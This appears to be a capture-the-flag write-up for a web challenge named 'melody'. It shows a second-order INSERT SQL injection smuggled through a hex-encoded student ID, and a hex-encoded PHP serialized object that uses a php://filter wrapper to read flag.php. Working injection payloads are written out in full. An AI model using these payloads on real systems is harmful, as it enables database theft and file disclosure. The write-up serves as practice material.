# Title
melody
# Tools
	* firefox or chrome,burpsuite
# Steps
	* 观察程序逻辑，用户的学号会被记录在log中而且会显示，注入十六进制数据，发现十六进制数据会被解码成字符串
	* 经过测试发现此处存在二次注入，而且是insert into注入，通过测试可知一共insert5列数据，构造payload：','a',(select database()),'a','a')#并进行16进制编码，在change.php中修改学号，重新登陆在log.php中看到回显
	* 通过sql注入遍历数据库，无法查找到flag，但会在users表中查找到16进制数据并解码得：O:4:"html":2:{s:7:"\x00*\x00html";s:44:"./html/c5041ad05d52383c6d9411246c16c891.html";s:8:"username";s:2:"nc";}。观察可知，这个反序列化会被用来包含文件
	* 在log表中发现debug参数，利用此提交最终payload:','a','a','0x4f3a343a2268746d6c223a323a7b733a373a22002a0068746d6c223b733a35373a227068703a2f2f66696c7465722f726561643d636f6e766572742e6261736536342d656e636f64652f7265736f757263653d666c61672e706870223b733a383a22757365726e616d65223b733a323a226161223b7d')#的16进制编码就可以读取flag.php的内容
